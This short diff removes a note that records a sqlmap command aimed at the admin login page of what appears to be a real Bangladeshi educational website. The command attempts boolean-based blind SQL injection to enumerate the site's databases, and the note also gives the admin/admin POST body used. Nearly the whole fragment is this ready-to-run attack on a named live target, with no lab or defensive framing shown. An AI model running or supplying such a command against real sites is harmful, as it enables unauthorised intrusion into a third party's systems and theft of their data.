@@ -1,3 +1,0 @@
-http://www.hmdc.edu.bd/admin/include/logincheck.php (POST)  # sqlmap.py -u http://www.hmdc.edu.bd/admin/include/logincheck.php --data username=admin&password=admin&login= --batch --random-agent --dbms=MySQL --technique=B --dbs --not-string=incorrect --level=3
-
-username=admin&password=admin&login=
